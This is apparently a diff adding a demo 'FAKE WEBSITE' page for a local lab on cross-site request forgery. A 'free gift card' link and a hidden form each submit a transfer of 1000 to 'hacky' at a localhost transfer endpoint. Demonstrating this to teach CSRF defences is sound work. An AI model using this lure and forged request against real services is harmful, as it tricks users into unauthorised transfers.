@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FAKE WEBSITE</title>
+</head>
+<body>
+    <h1>Get a free gift card!</h1>
+    <a href="http://localhost:4000/transfer?amount=1000&recipient=hacky">Click here!</a>
+    <br />
+    <h2>or here, if that doesn't work!</h2>
+    <form method="post" action="http://localhost:4000/transfer">
+        <input type="hidden" name="amount" value="1000" />
+        <input type="hidden" name="recipient" value="hacky" />
+        <button type="submit">Get free gift card!</button>
+        <input type="hidden" name="_csrf" value="<%= csrfToken %>" />
+    </form>
+</body>
+</html>
